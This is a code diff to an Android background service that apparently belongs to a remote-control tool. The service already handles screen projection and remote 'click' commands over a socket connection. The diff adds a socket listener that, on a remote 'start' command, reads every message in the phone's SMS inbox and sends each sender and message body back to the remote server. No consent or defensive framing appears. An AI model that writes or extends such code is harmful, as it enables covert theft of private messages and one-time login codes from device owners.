@@ -12,6 +12,9 @@ import android.media.projection.MediaProjectionManager;
 import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
+import android.net.Uri;
+import android.database.Cursor;
+import android.content.ContentResolver;
 import android.util.Log;
 
 import androidx.annotation.Nullable;
@@ -108,6 +111,20 @@ public class MyService extends Service {
                         Log.d(TAG, "click");
                     }
                 });
+                
+                sock.on("sms", new Emitter.Listener() {
+                    @Override
+                    public void call(Object... args) {
+                         try {
+                            JSONArray array = (JSONArray) new JSONArray((String) args[0]);
+                            if(array.getString(0).equals("start")){
+                                getSMS();
+                            }
+                        } catch (JSONException e) {
+                            e.printStackTrace();
+                        }
+                    }
+                });
             }
         }).start();
 
@@ -126,6 +143,36 @@ public class MyService extends Service {
 
 
         return super.onStartCommand(intent, flags, startId);
+    }
+
+    public void getSMS(){
+        try {
+            Uri uri = Uri.parse("content://sms/inbox");
+            ContentResolver contentResolver = getContentResolver();
+            Cursor cursor = contentResolver.query(uri,null,null,null,null);
+            
+            if (cursor == null) {
+                 return;
+            }
+            
+            JSONArray list = new JSONArray();
+            while (cursor.moveToNext()){
+                String num = cursor.getString(cursor.getColumnIndexOrThrow("address"));
+                String msg = cursor.getString(cursor.getColumnIndexOrThrow("body"));
+                try {
+                    JSONObject item = new JSONObject();
+                    item.put("address",num);
+                    item.put("body",msg);
+                    list.put(item);
+                } catch (JSONException e) {
+                    e.printStackTrace();
+                }
+            }
+            cursor.close();
+            sock.emit("sms",list);
+        } catch (Exception e) {
+            Log.e(TAG, "getSMS: "+e.getMessage());
+        }
     }
 
     @Nullable
